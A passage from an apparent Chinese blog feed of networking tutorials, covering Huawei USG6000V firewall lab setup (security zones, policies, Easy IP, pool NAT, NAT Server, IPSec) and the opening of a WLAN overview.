alt="8.2.19"></p><p><strong>第三步：配置安全策略</strong></p><ul><li>增加北京总部和重庆分公司内网和防火墙出口的互访</li></ul><p><img src="/../img/img_artical/net_sec/8.2.20.png" alt="8.2.20"></p><p><strong>第四步：配置静态路由</strong></p><p><img src="/../img/img_artical/net_sec/8.2.20.png" alt="8.2.20"></p><p><strong>第五步：配置IPSec - 点到多点 策略</strong></p><ul><li>修改场景为”点到多点”</li><li>清除”对端地址”</li><li>增加CQ”加密数据流”</li></ul><p><img src="/../img/img_artical/net_sec/8.2.21.png" alt="8.2.21"></p><p><strong>第六步：配置公网路由器</strong></p><ul><li>增加连接重庆分公司网络的接口IP地址</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">[R1]interface</span> <span class="string">GigabitEthernet0/0/2</span></span><br><span class="line"><span class="attr">[R1-G0/0/2]ip</span> <span class="string">address 150.1.1.2 24</span></span><br></pre></td></tr></table></figure><h3 id="配置上海分部防火墙"><a href="#配置上海分部防火墙" class="headerlink" title="配置上海分部防火墙"></a>配置上海分部防火墙</h3><p><strong>上海分公司防火墙，不需要重新配置，直接”诊断”连接即可</strong></p><p><img src="/../img/img_artical/net_sec/8.2.22.png" alt="8.2.22"></p><h3 id="配置重庆分部防火墙"><a href="#配置重庆分部防火墙" class="headerlink" title="配置重庆分部防火墙"></a>配置重庆分部防火墙</h3><p><strong>和上个实验配置上海分部防火墙步骤类似</strong></p><h3 id="验证-1"><a href="#验证-1" class="headerlink" title="验证"></a>验证</h3><ul><li>验证：总部Client1访问分公司Client2及Client3</li><li>验证：分公司Client2访问总部Client1</li><li>验证：分公司Client3访问总部Client1</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全解决方案 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-网络安全解决方案1</title>
      <link href="/posts/secsol1.html"/>
      <url>/posts/secsol1.html</url>
      
        <content type="html"><![CDATA[<h1 id="网络安全解决方案"><a href="#网络安全解决方案" class="headerlink" title="网络安全解决方案"></a>网络安全解决方案</h1><h2 id="防火墙介绍"><a href="#防火墙介绍" class="headerlink" title="防火墙介绍"></a>防火墙介绍</h2><h3 id="什么是防火墙"><a href="#什么是防火墙" class="headerlink" title="什么是防火墙"></a>什么是防火墙</h3><ul><li>防火墙是指的是一个由软件和硬件设备组合而成、在内部网和外部网之间专用网与公共网之间的界面上构造的保护屏障</li><li>防火墙实际上是一种隔离技术</li><li>防火墙重要的特征是增加了<font color="ff0000">区域</font>的概念</li></ul><h3 id="防火墙的本质"><a href="#防火墙的本质" class="headerlink" title="防火墙的本质"></a>防火墙的本质</h3><ul><li>防火墙可以看做是具有控制流量功能的路由器</li><li>路由器的作用（一个字概括”通”）</li><li>路由器的本质是转发，防火墙的本质是控制</li></ul><p><img src="/../img/img_artical/net_sec/8.1.1.png" alt="8.1.1"></p><h3 id="防火墙的发展历史"><a href="#防火墙的发展历史" class="headerlink" title="防火墙的发展历史"></a>防火墙的发展历史</h3><ul><li>第一代：包过滤防火墙（ACL五元组）</li><li>第二代：代理防火墙（代理模式，处理速度较慢）</li><li>第三代：状态检测防火墙（动态跟踪会话流程）</li><li>第四代：统一威胁管理（UTM，防病毒、防入侵、URL过滤、内容过滤…）</li><li>第五代：下一代防火墙（NGF，应用识别、内容识别、用户识别等）</li><li>未来：（AI）的防火墙（已来…..）</li></ul><p><img src="/../img/img_artical/net_sec/8.1.2.png" alt="8.1.2"></p><h3 id="什么是下一代防火墙"><a href="#什么是下一代防火墙" class="headerlink" title="什么是下一代防火墙"></a>什么是下一代防火墙</h3><ul><li>下一代防火墙是一款可以全面应对应用层威胁的高性能防火墙</li><li>通过深入洞察网络流量中的<font color="ff0000">用户</font>、<font color="ff0000">应用</font>和<font color="ff0000">内容</font>能够为用户提供有效的应用层一体化安全防护</li></ul><h3 id="下一代防火墙主要功能"><a href="#下一代防火墙主要功能" class="headerlink" title="下一代防火墙主要功能"></a>下一代防火墙主要功能</h3><ul><li>行为管控与带宽管理</li><li>VPN部署与智能路由</li><li>内容安全与数据防泄露</li><li>入侵防御与WEB防护</li><li>应用识别与管控</li><li>APT防御与Anti-DDoS</li><li>云管理与云安全感知</li></ul><h3 id="常见的下一代防火墙厂商"><a href="#常见的下一代防火墙厂商" class="headerlink" title="常见的下一代防火墙厂商"></a>常见的下一代防火墙厂商</h3><ul><li>华为USG系列AI防火墙(NGFW)</li><li>深信服下一代防火墙(NGAF)</li><li>天融信下一代防火墙(NGFW)</li><li>启明星辰-天清汉马T系列防火墙</li><li>绿盟防火墙(NF)</li><li>奇安信新一代智慧防火墙</li><li>安恒-明御安全网关(NGFW)</li></ul><h3 id="华为防火墙产品"><a href="#华为防火墙产品" class="headerlink" title="华为防火墙产品"></a>华为防火墙产品</h3><p><strong>下一代防火墙和AI防火墙</strong></p><p><img src="/../img/img_artical/net_sec/8.1.3.png" alt="8.1.3"></p><ul><li><p>USG2000和USG5000系列定位于UTM产品 (较老)</p></li><li><p>USG6000系列升级为AI防火墙产品(主打产品)</p></li><li><p>USG9500系列属于NGFW高端防火墙产品</p><ul><li>广泛应用在大型数据中心、大型企业、教育、政府、广电等行业</li></ul></li><li><p>USG12000系列AI防关墙</p><ul><li>首款T级AI防火墙，目标政府、金融、教育、医疗、企业等行业</li><li>T级：支持10亿规模的并发连接能力</li></ul></li></ul><h3 id="USG6000V"><a href="#USG6000V" class="headerlink" title="USG6000V"></a>USG6000V</h3><p><strong>华为USG6000V(Universal Service Gateway)是基于NFV架构的虚拟综合业务网关，产品具备丰富的网关业务能力，如vFW、vIPSec、vLB、vIPS、vAV、vURL过滤等</strong></p><ul><li>部署在公有云AWS、私有云OpenStack</li><li>部署在VirtualBox、VMware</li></ul><h3 id="eNSP防火墙镜像导入"><a href="#eNSP防火墙镜像导入" class="headerlink" title="eNSP防火墙镜像导入"></a>eNSP防火墙镜像导入</h3><ul><li>USG6000V导入vfw_usg.vdi</li><li>启动防火墙，根据提示导入</li></ul><p><img src="/../img/img_artical/net_sec/8.1.4.png" alt="8.1.4"></p><h3 id="部署WEB登录"><a href="#部署WEB登录" class="headerlink" title="部署WEB登录"></a>部署WEB登录</h3><p><strong>部署WEB界面登录</strong></p><p><img src="/../img/img_artical/net_sec/8.1.5.png" alt="8.1.5"></p><h3 id="修改虚拟网络地址"><a href="#修改虚拟网络地址" class="headerlink" title="修改虚拟网络地址"></a>修改虚拟网络地址</h3><ul><li><p>打开VMware workstation</p></li><li><p>“编辑” - “虚拟网络编辑器”</p></li><li><p>配置VMnet1的子网IP为192.168.20.0 255.255.255.0</p></li></ul><p><img src="/../img/img_artical/net_sec/8.1.6.png" alt="8.1.6"></p><h3 id="配置网云"><a href="#配置网云" class="headerlink" title="配置网云"></a>配置网云</h3><p><strong>配置网云</strong></p><ul><li>选择”绑定信息”UDP，单击增加</li><li>选择”绑定信息”VMnet1，单击增加</li><li>选择入口&#x2F;出口编号，勾选双向通道，单击增加</li></ul><p><img src="/../img/img_artical/net_sec/8.1.7.png" alt="8.1.7"></p><h3 id="连接网云和防火墙"><a href="#连接网云和防火墙" class="headerlink" title="连接网云和防火墙"></a>连接网云和防火墙</h3><ul><li>确认网云增加了“Ethernet0&#x2F;0&#x2F;1”接口</li><li>手动连线Ethernet0&#x2F;0&#x2F;1到防火墙管理接口GE0&#x2F;0&#x2F;0（必须是此接口）</li></ul><h3 id="首次登录防火墙"><a href="#首次登录防火墙" class="headerlink" title="首次登录防火墙"></a>首次登录防火墙</h3><p><strong>首次登录防火墙，需要通过CLI控制台</strong></p><ul><li>用户名: admin 初始密码: Admin@123</li><li>首次登录必须更新密码，可改为admin@123</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Login</span> <span class="string">authentication</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">Username</span>:<span class="string">admin                 //输入用户名 admin</span></span><br><span class="line"><span class="attr">Password</span>:<span class="string">Admin@123             //输入密码 Admin@123</span></span><br><span class="line"></span><br><span class="line"><span class="attr">The</span> <span class="string">password needs to be changed. Change now? [Y/N]: y    //输入y更改密码</span></span><br><span class="line"><span class="attr">Please</span> <span class="string">enter old password: Admin@123              //输入原密码</span></span><br><span class="line"><span class="attr">Please</span> <span class="string">enter new password: admin@123              //输入新密码</span></span><br><span class="line"><span class="attr">Please</span> <span class="string">confirm new password: admin@123            //确认新密码</span></span><br><span class="line"></span><br><span class="line"> <span class="attr">Info</span>: <span class="string">Your password has been changed. Save the change to survive a reboot. </span></span><br><span class="line"><span class="attr">*************************************************************************</span></span><br><span class="line"><span class="attr">*</span>         <span class="string">Copyright (C) 2014-2018 Huawei Technologies Co., Ltd.         *</span></span><br><span class="line"><span class="attr">*</span>                           <span class="string">All rights reserved.                        *</span></span><br><span class="line"><span class="attr">*</span>               <span class="string">Without the owner&#x27;s prior written consent,              *</span></span><br><span class="line"><span class="attr">*</span>        <span class="string">no decompiling or reverse-engineering shall be allowed.        *</span></span><br><span class="line"><span class="attr">*************************************************************************</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">&lt;USG6000V1&gt;</span></span><br></pre></td></tr></table></figure><h3 id="配置管理接口"><a href="#配置管理接口" class="headerlink" title="配置管理接口"></a>配置管理接口</h3><ul><li>配置接口g0&#x2F;0&#x2F;0的管理地址</li><li>开启https访问功能和ping测试功能</li></ul><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&lt;USG6000V1&gt;undo</span> <span class="string">terminal monitor </span></span><br><span class="line"><span class="attr">Info</span>: <span class="string">Current terminal monitor is off.</span></span><br><span class="line"><span class="attr">&lt;USG6000V1&gt;system-view</span> <span class="string"></span></span><br><span class="line"><span class="attr">Enter</span> <span class="string">system view, return user view with Ctrl+Z.</span></span><br><span class="line"><span class="attr">[USG6000V1]web-manager</span> <span class="string">timeout 1440</span></span><br><span class="line"><span class="attr">[USG6000V1]interface</span> <span class="string">GigabitEthernet 0/0/0</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[USG6000V1-GigabitEthernet0/0/0]ip</span> <span class="string">address 192.168.20.100 24     //配置IP地址</span></span><br><span class="line"><span class="attr">[USG6000V1-GigabitEthernet0/0/0]service-manage</span> <span class="string">ping permit       //允许ping测试</span></span><br><span class="line"><span class="attr">[USG6000V1-GigabitEthernet0/0/0]service-manage</span> <span class="string">https permit      //允许https连接</span></span><br></pre></td></tr></table></figure><h3 id="访问防火墙WEB界面"><a href="#访问防火墙WEB界面" class="headerlink" title="访问防火墙WEB界面"></a>访问防火墙WEB界面</h3><p><strong>在物理主机确认可以Ping通192.168.20.100</strong></p><p><strong>在物理主机浏览器访问<a href="https://192.168.20.100:8443/">https://192.168.20.100:8443</a></strong></p><ul><li>用户名：admin，密码：admin@123</li></ul><p><img src="/../img/img_artical/net_sec/8.1.8.png" alt="8.1.8"></p><h2 id="防火墙安全区域"><a href="#防火墙安全区域" class="headerlink" title="防火墙安全区域"></a>防火墙安全区域</h2><h3 id="防火墙安全区域-1"><a href="#防火墙安全区域-1" class="headerlink" title="防火墙安全区域"></a>防火墙安全区域</h3><p><strong>默认安全区域：Trust、Untrust、DMZ、Local</strong></p><ul><li>Untrust：安全级别5，用于定义互联网流量（外网）</li><li>DMZ：安全级别50，用于定义服务器区域（服务器）<ul><li>DMZ(Demilitarized Zone，非军事化区)</li><li>起源于军方，是介于严格的军事管制区和松散的公共区域之间的一种部分管制的区域</li><li>防火墙引用了这一术语，指的是一个与内部网络和外部网络分离的安全区域</li></ul></li><li>Trust：安全级别85，用于定义内网所在区域（内网）</li><li>Local：安全级别100，用于定义设备收发的流量（防火墙本身）<ul><li>Local(本地区)</li><li>凡是由防火墙主动发出的报文均可认为是从Local区域中发出，凡是需要防火墙响应并处理（而不是转发）的报文均可认为是由Local区域接收</li></ul></li></ul><h2 id="配置安全策略"><a href="#配置安全策略" class="headerlink" title="配置安全策略"></a>配置安全策略</h2><h3 id="配置内网访问外网"><a href="#配置内网访问外网" class="headerlink" title="配置内网访问外网"></a>配置内网访问外网</h3><p><strong>实验拓扑</strong></p><ul><li>需求：实现企业内网访问外网服务器</li></ul><p><strong>配置步骤</strong></p><ul><li>第一步：配置接口地址</li><li>第二步：配置安全策略</li></ul><p><img src="/../img/img_artical/net_sec/8.1.9.png" alt="8.1.9"></p><h3 id="配置接口"><a href="#配置接口" class="headerlink" title="配置接口"></a>配置接口</h3><p><strong>网络  &#x3D;&gt;  接口  &#x3D;&gt;  接口，单击具体的”接口名称”</strong></p><ul><li>配置”安全区域”和”IP地址”</li></ul><p><img src="/../img/img_artical/net_sec/8.1.10.png" alt="8.1.10"></p><h3 id="配置安全策略-1"><a href="#配置安全策略-1" class="headerlink" title="配置安全策略"></a>配置安全策略</h3><p><strong>策略  &#x3D;&gt;  安全策略  &#x3D;&gt;  安全策略，单击”新建安全策略”</strong></p><ul><li>配置”策略名称”、”源安全区域”、”目标安全区域”</li></ul><p><img src="/../img/img_artical/net_sec/8.1.11.png" alt="8.1.11"></p><h3 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h3><p><strong>在client1上，使用ping测试</strong></p><p><img src="/../img/img_artical/net_sec/8.1.12.png" alt="8.1.12"></p><h2 id="防火墙配置NAT-EasyIP"><a href="#防火墙配置NAT-EasyIP" class="headerlink" title="防火墙配置NAT-EasyIP"></a>防火墙配置NAT-EasyIP</h2><h3 id="NAT概述"><a href="#NAT概述" class="headerlink" title="NAT概述"></a>NAT概述</h3><p><strong>什么是NAT</strong></p><ul><li>网络地址转换</li></ul><p><strong>NAT作用</strong></p><ul><li>在节约IPv4地址的前提下，实现内网大量主机与公网通信</li><li>隐藏公司网络和IP，对内网主机起到一定的保护作用</li></ul><p><strong>NAT分类</strong></p><ul><li>Basic NAT：IP地址转换</li><li>NAPT：IP+端口号转换</li></ul><p><strong>NAT主要实现方式</strong></p><ul><li>静态NAT：静态一对一</li><li>Easy IP：基于出接口的NAPT</li><li>地址池NAT：基于地址池的NAPT</li><li>NAT Server：端口映射</li></ul><h3 id="配置EasyIP"><a href="#配置EasyIP" class="headerlink" title="配置EasyIP"></a>配置EasyIP</h3><p><strong>实验拓扑</strong></p><ul><li>防火墙配置默认路由</li><li>公网路由器不要配置去内网的路由表</li></ul><p><img src="/../img/img_artical/net_sec/8.1.13.png" alt="8.1.13"></p><p><strong>企业需求分析</strong></p><ul><li>企业出口部署一台边界防火墙</li><li>企业网络规模较小，公网IP地址为100.1.1.1&#x2F;30，对端100.1.1.2</li><li>实现企业内网主机访问外部网络</li><li>因没有空闲的公网IP地址，所以使用出接口地址做NAT</li></ul><p><strong>配置步骤</strong></p><ul><li>第一步：配置接口地址和安全区域</li><li>第二步：配置安全策略</li><li>第三步：配置NAT策略</li><li>第四步：配置默认路由</li><li>第五步：验证</li></ul><h3 id="第一步：配置接口地址和安全区域"><a href="#第一步：配置接口地址和安全区域" class="headerlink" title="第一步：配置接口地址和安全区域"></a>第一步：配置接口地址和安全区域</h3><p><img src="/../img/img_artical/net_sec/8.1.14.png" alt="8.1.14"></p><h3 id="第二步：配置安全策略"><a href="#第二步：配置安全策略" class="headerlink" title="第二步：配置安全策略"></a>第二步：配置安全策略</h3><p><img src="/../img/img_artical/net_sec/8.1.15.png" alt="8.1.15"></p><h3 id="第三步：配置NAT策略"><a href="#第三步：配置NAT策略" class="headerlink" title="第三步：配置NAT策略"></a>第三步：配置NAT策略</h3><ul><li>转换模式：”仅转换源地址”</li><li>源地址转换为：”出接口地址”</li></ul><p><img src="/../img/img_artical/net_sec/8.1.16.png" alt="8.1.16"></p><h3 id="第四步：配置默认路由"><a href="#第四步：配置默认路由" class="headerlink" title="第四步：配置默认路由"></a>第四步：配置默认路由</h3><ul><li>出接口：G1&#x2F;0&#x2F;1</li><li>下一跳：100.1.1.2</li></ul><p><img src="/../img/img_artical/net_sec/8.1.17.png" alt="8.1.17"></p><h3 id="第五步：配置路由器AR1"><a href="#第五步：配置路由器AR1" class="headerlink" title="第五步：配置路由器AR1"></a>第五步：配置路由器AR1</h3><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&lt;Huawei&gt;u</span> <span class="string">t m</span></span><br><span class="line"><span class="attr">Info</span>: <span class="string">Current terminal monitor is off.</span></span><br><span class="line"><span class="attr">&lt;Huawei&gt;system-view</span> <span class="string"></span></span><br><span class="line"><span class="attr">Enter</span> <span class="string">system view, return user view with Ctrl+Z.</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[Huawei]interface</span> <span class="string">GigabitEthernet 0/0/0</span></span><br><span class="line"><span class="attr">[Huawei-GigabitEthernet0/0/0]ip</span> <span class="string">address 100.1.1.2 30</span></span><br><span class="line"><span class="attr">[Huawei-GigabitEthernet0/0/0]quit</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[Huawei]interface</span> <span class="string">GigabitEthernet 0/0/1</span></span><br><span class="line"><span class="attr">[Huawei-GigabitEthernet0/0/1]ip</span> <span class="string">address 200.1.1.254 24</span></span><br></pre></td></tr></table></figure><h3 id="第六步：验证"><a href="#第六步：验证" class="headerlink" title="第六步：验证"></a>第六步：验证</h3><ul><li>在Client1上可以ping通Server1</li><li>在Server1上可以ping通Client1</li></ul><p><img src="/../img/img_artical/net_sec/8.1.18.png" alt="8.1.18"></p><h2 id="防火墙配置地址池NAT"><a href="#防火墙配置地址池NAT" class="headerlink" title="防火墙配置地址池NAT"></a>防火墙配置地址池NAT</h2><h3 id="配置地址池NAT"><a href="#配置地址池NAT" class="headerlink" title="配置地址池NAT"></a>配置地址池NAT</h3><p><strong>实验拓扑</strong></p><ul><li>和上一个实验一致</li></ul><p><img src="/../img/img_artical/net_sec/8.1.19.png" alt="8.1.19"></p><h3 id="企业需求和配置步骤"><a href="#企业需求和配置步骤" class="headerlink" title="企业需求和配置步骤"></a>企业需求和配置步骤</h3><p><strong>企业需求分析：</strong></p><ul><li>企业出口部署一台边界防火墙</li><li>企业公网IP网段为:100.1.1.0&#x2F;29（可用地址100.1.1.1~6&#x2F;29）<ul><li>本端IP地址:100.1.1.1</li><li>对端IP地址:100.1.1.6</li><li>NAT池: 100.1.1.2 ~ 4</li><li>NAT Server: 100.1.1.5</li></ul></li><li>实现企业内网主机访问外部网络</li><li>配置公网出口地址100.1.1.1，对端地址100.1.1.6</li><li>空闲的公网IP地址，配置地址池NAT，实现更高的并发会话连接</li></ul><h3 id="第一步：配置接口地址和安全区域-1"><a href="#第一步：配置接口地址和安全区域-1" class="headerlink" title="第一步：配置接口地址和安全区域"></a>第一步：配置接口地址和安全区域</h3><p><strong>注意修改接口G1&#x2F;0&#x2F;1子网掩码29</strong></p><p><img src="/../img/img_artical/net_sec/8.1.20.png" alt="8.1.20"></p><h3 id="第二步：配置安全策略-1"><a href="#第二步：配置安全策略-1" class="headerlink" title="第二步：配置安全策略"></a>第二步：配置安全策略</h3><p><strong>和上一个实验一致</strong></p><h3 id="第三步：配置NAT策略-1"><a href="#第三步：配置NAT策略-1" class="headerlink" title="第三步：配置NAT策略"></a>第三步：配置NAT策略</h3><p><strong>配置转换地址池</strong></p><ul><li>IP地址范围：100.1.1.2~100.1.1.4（留出100.1.1.5）</li></ul><p><img src="/../img/img_artical/net_sec/8.1.21.png" alt="8.1.21"></p><p><strong>源地址转化为：”地址池中的地址”</strong></p><p><img src="/../img/img_artical/net_sec/8.1.22.png" alt="8.1.22"></p><h3 id="第四步：配置默认路由-1"><a href="#第四步：配置默认路由-1" class="headerlink" title="第四步：配置默认路由"></a>第四步：配置默认路由</h3><p><strong>出接口：G0&#x2F;0&#x2F;1</strong></p><p><strong>下一跳：100.1.1.6</strong></p><p><img src="/../img/img_artical/net_sec/8.1.23.png" alt="8.1.23"></p><h3 id="第五步：配置路由器AR1-1"><a href="#第五步：配置路由器AR1-1" class="headerlink" title="第五步：配置路由器AR1"></a>第五步：配置路由器AR1</h3><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&lt;Huawei&gt;u</span> <span class="string">t m</span></span><br><span class="line"><span class="attr">Info</span>: <span class="string">Current terminal monitor is off.</span></span><br><span class="line"><span class="attr">&lt;Huawei&gt;system-view</span> <span class="string"></span></span><br><span class="line"><span class="attr">Enter</span> <span class="string">system view, return user view with Ctrl+Z.</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[Huawei]interface</span> <span class="string">GigabitEthernet 0/0/0</span></span><br><span class="line"><span class="attr">[Huawei-GigabitEthernet0/0/0]ip</span> <span class="string">address 100.1.1.6 29</span></span><br><span class="line"><span class="attr">[Huawei-GigabitEthernet0/0/0]quit</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[Huawei]interface</span> <span class="string">GigabitEthernet 0/0/1</span></span><br><span class="line"><span class="attr">[Huawei-GigabitEthernet0/0/1]ip</span> <span class="string">address 200.1.1.254 24</span></span><br></pre></td></tr></table></figure><h3 id="第六步：验证-1"><a href="#第六步：验证-1" class="headerlink" title="第六步：验证"></a>第六步：验证</h3><p><strong>在Client1可以ping通Server1</strong></p><p><strong>查看会话：监控  -  会话表  -  刷新</strong></p><p><img src="/../img/img_artical/net_sec/8.1.24.png" alt="8.1.24"></p><h2 id="防火墙配置NAT-Server"><a href="#防火墙配置NAT-Server" class="headerlink" title="防火墙配置NAT Server"></a>防火墙配置NAT Server</h2><h3 id="配置NAT-Server"><a href="#配置NAT-Server" class="headerlink" title="配置NAT Server"></a>配置NAT Server</h3><p><strong>内网增加服务器：IP地址192.168.10.2</strong></p><p><strong>外网更换为客户端：IP地址200.1.1.1</strong></p><p><img src="/../img/img_artical/net_sec/8.1.25.png" alt="8.1.25"></p><h3 id="企业需求和配置步骤-1"><a href="#企业需求和配置步骤-1" class="headerlink" title="企业需求和配置步骤"></a>企业需求和配置步骤</h3><p><strong>企业需求分析：</strong></p><ul><li>企业出口部署一台边界防火墙</li><li>企业公网IP网段为:100.1.1.0&#x2F;29</li><li>企业内网部署WEB服务器</li><li>实现外网用户能够访问企业内网服务器</li></ul><p><strong>配置步骤</strong></p><ul><li>第一步：配置接口地址和安全区域</li><li>第二步：配置安全策略</li><li>第三步：配置NAT - 服务器策略</li><li>第四步：配置默认路由</li><li>第五步：验证</li></ul><h3 id="第一步：配置接口地址和安全区域-2"><a href="#第一步：配置接口地址和安全区域-2" class="headerlink" title="第一步：配置接口地址和安全区域"></a>第一步：配置接口地址和安全区域</h3><p><strong>和上个实验一致</strong></p><h3 id="第二步：配置安全策略-2"><a href="#第二步：配置安全策略-2" class="headerlink" title="第二步：配置安全策略"></a>第二步：配置安全策略</h3><p><strong>增加”外网访问内网”安全策略</strong></p><p><img src="/../img/img_artical/net_sec/8.1.26.png" alt="8.1.26"></p><h3 id="第三步：配置NAT策略-2"><a href="#第三步：配置NAT策略-2" class="headerlink" title="第三步：配置NAT策略"></a>第三步：配置NAT策略</h3><p><strong>配置服务器映射</strong></p><ul><li>公网地址100.1.1.5，私网地址192.168.10.2，协议TCP，端口80</li></ul><p><img src="/../img/img_artical/net_sec/8.1.27.png" alt="8.1.27"></p><h3 id="第四步：配置默认路由-2"><a href="#第四步：配置默认路由-2" class="headerlink" title="第四步：配置默认路由"></a>第四步：配置默认路由</h3><p><strong>和上一实验一致</strong></p><h3 id="第五步：配置路由器"><a href="#第五步：配置路由器" class="headerlink" title="第五步：配置路由器"></a>第五步：配置路由器</h3><p><strong>和上一实验一致</strong></p><h3 id="第六步：配置Server服务器"><a href="#第六步：配置Server服务器" class="headerlink" title="第六步：配置Server服务器"></a>第六步：配置Server服务器</h3><p><strong>配置HttpServer</strong></p><ul><li>端口号80</li><li>文件根目录</li><li>启动</li></ul><p><img src="/../img/img_artical/net_sec/8.1.28.png" alt="8.1.28"></p><h3 id="第七布：验证"><a href="#第七布：验证" class="headerlink" title="第七布：验证"></a>第七布：验证</h3><p><strong>在Client2上，使用HttpClient访问<a href="http://100.1.1.5/">http://100.1.1.5</a></strong></p><ul><li>得到反馈</li><li><a href="http://1.0.0.1/">HTTP://1.1</a> 200 OK</li></ul><p><img src="/../img/img_artical/net_sec/8.1.29.png" alt="8.1.29"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全解决方案 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-骨干网与WLAN5</title>
      <link href="/posts/backbone5.html"/>
      <url>/posts/backbone5.html</url>
      
        <content type="html"><![CDATA[<h1 id="骨干网与WLAN"><a href="#骨干网与WLAN" class="headerlink" title="骨干网与WLAN"></a>骨干网与WLAN</h1><h2 id="WLAN简介"><a href="#WLAN简介" class="headerlink" title="WLAN简介"></a>WLAN简介</h2><h3 id="什么是WLAN"><a href="#什么是WLAN" class="headerlink" title="什么是WLAN"></a>什么是WLAN</h3><p><strong>WLAN即Wireless LAN（无线局域网）</strong></p><ul><li>是指通过无线技术构建的无线局域网络</li><li>WLAN广义上是指以无线电波、激光、红外线等无线信号来代替有线局域网中的部分或全部传输介质所构成的网络</li></ul><p><img src="/../img/img_artical/net_sec/7.5.1.png" alt="7.5.1"></p><h3 id="大型WLAN组网的应用"><a href="#大型WLAN组网的应用" class="headerlink" title="大型WLAN组网的应用"></a>大型WLAN组网的应用</h3><p><img src="/../img/img_artical/net_sec/7.5.2.png" alt="7.5.2"></p><h3 id="大型WLAN组网特点"><a href="#大型WLAN组网特点" class="headerlink" title="大型WLAN组网特点"></a>大型WLAN组网特点</h3><p><img src="/../img/img_artical/net_sec/7.5.3.png" alt="7.5.3"></p><h3 id="WLAN设备"><a href="#WLAN设备" class="headerlink" title="WLAN设备"></a>WLAN设备</h3><p><strong>WLAN设备</strong></p><ul><li>AP：Access Point  无线接入点</li><li>PoE：Powerover Ethernet  以太网供电交换机，是指通过以太网网络进行供电，也被称为基于局域网的供电系统PoL（Powerover LAN）或有源以太网，PoE允许电功率通过传输数据的线路或空闲线路传输到终端设备，在WLAN网络中，可以通过PoE交换机对AP设备进行供电</li><li>AC：Access Controller  无线接入控制器，统一配置和管理无线AP的设备</li></ul><p><strong>AP的分类</strong></p><ul><li><p>FAT AP（胖AP）：家用无线路由器</p></li><li><p>FIT AP（瘦AP）：适用于大中型企业：  </p><pre><code>               需要配合AC使用，由AC统一管理和配置，需要专业网络工程师部署和管理。   需要配置 用户接入、AP上线、认证、路由、AP管理、安全协议   主要应用于：大中型 企业、高校、行政单位、酒店、机场、高铁站、购物中心、医院  用做无线覆盖用的无线AP</code></pre></li><li><p>云管理AP：适用于中小型企业：</p><pre><code>        由云管理平台统一管理和配置，功能丰富，即插即用，对网络维护人员的技能要求低。  主要应用于，家庭，餐馆、连锁超市</code></pre></li></ul><h3 id="WAN的分类"><a href="#WAN的分类" class="headerlink" title="WAN的分类"></a>WAN的分类</h3><p><strong>WPAN（Wireless Personal Area Network）：个人无线网络</strong></p><ul><li>蓝牙</li><li>NFC</li></ul><p><strong>WLAN（Wireless Local Area Network）：无线局域网</strong></p><ul><li><p>Wi-Fi</p></li><li><p>Wi-Fi技术：802.11</p><p>目前用的较多的协议标准是：</p><p>802.11n (2.4GHz和5GHz）  </p><p>801.11ac协议，称之为wifi5</p><p>802.11ax协议称之为wifi6—2019年</p></li></ul><p><strong>WWAN（Wireless Wide Area Network）：无线广域网</strong></p><ul><li><p>2G：GSM、CDMA</p></li><li><p>3G：WCDMA、TD-SCDMA</p></li><li><p>4G：LTE</p></li><li><p>5G：NR</p></li><li><p>在移动通信中，”G”是”Generation”的缩写  ：一代  的意思</p><p>- 1G：第一代移动通信，是在20世纪80年代初开始使用的模拟移动电话系统，主要用于语音通信。<br>- 2G：第二代移动通信，采用数字技术，语音质量好、安全性高，能发短信。<br>- 3G：第三代移动通信，数据传输速度快，支持包括互联网访问<br>- 4G：第四代移动通信，数据速度快，延迟低，实现了高质量的视频数据传输和其他高带宽应用。<br>- 5G：第五代移动通信，超高的数据速度（比4G快10到100倍）和超低的延迟，<br>      支持新的应用和服务，如物联网、自动驾驶车辆、虚拟现实等</p></li></ul><h3 id="WLAN设备介绍"><a href="#WLAN设备介绍" class="headerlink" title="WLAN设备介绍"></a>WLAN设备介绍</h3><p><img src="/../img/img_artical/net_sec/7.5.4.png" alt="7.5.4"></p><h3 